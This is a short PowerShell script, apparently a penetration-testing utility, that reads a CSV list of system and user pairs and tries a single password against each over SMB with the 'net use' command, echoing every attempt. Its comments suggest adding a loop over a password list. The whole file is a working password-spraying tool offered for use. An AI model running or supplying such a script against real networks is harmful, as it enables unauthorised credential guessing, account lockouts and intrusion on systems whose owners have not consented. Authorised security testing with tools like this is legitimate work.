#script to try a single password for a list of users and systems over SMB/NetBIOS with net use command
#list in csv format: (ex) 'system,user'

#list of systems to try
$system_list = get-content "<file_location>"

#input password to try.  could add another foreach loop if using password list
$password = '<single_password>'

#loop through 
foreach ($line in $system_list){
	$test = $line.split("{,}")
	$system = $test[0]
	$user = $test[1]

	echo "trying command: net use \\$system /user:$system\$user $password"
	net use \\$system /user:"$system\$user" $password
}
